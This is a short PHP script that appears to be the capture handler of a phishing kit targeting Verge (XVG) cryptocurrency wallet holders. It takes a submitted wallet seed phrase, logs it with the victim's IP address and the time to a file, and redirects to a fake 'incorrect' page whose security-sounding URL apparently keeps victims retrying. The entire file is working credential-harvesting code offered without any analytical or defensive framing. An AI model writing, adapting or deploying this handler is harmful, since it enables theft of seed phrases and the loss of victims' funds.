<?php
$file = "Verge_______________XVG";
$walletSeed   = $_POST['kata_mutiara'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "----------------------------------------------------------------");
fwrite($handle, "\n");
fwrite($handle, "KEY : ");
fwrite($handle, "$walletSeed");
fwrite($handle, "\n");

fwrite($handle, "IP  : ");

fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:incorrect.html?attempt=update_security_info_api_keyskip_api_login=1display=pagedirselect=webrootselecthome");

?>